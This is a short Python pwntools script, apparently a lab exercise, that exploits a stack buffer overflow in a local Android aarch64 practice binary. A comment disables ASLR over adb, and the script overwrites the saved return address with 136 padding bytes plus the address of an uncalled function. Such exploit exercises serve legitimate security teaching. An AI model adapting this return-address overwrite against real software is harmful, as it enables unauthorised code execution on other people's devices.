#!/usr/bin/python

'''
adb root && adb shell 'echo 0 > /proc/sys/kernel/randomize_va_space'

stack:
        ~~~~~~
        8
x30     -------
        8
x29     -------
        128
buf     -------
        48
sp      ------- <- vulnerable
'''

from pwn import *

context(arch='aarch64', endian='little', word_size=64, os='android')

base_addr = 0x5555555000
not_called = 0x7f8 + base_addr

payload = 'a' * 136
payload += p64(not_called)

bin_path = '/data/local/tmp/02-overwrite-ret'
proc = adb.process([bin_path])
proc.recvuntil('> ')
proc.send(payload)
proc.interactive()
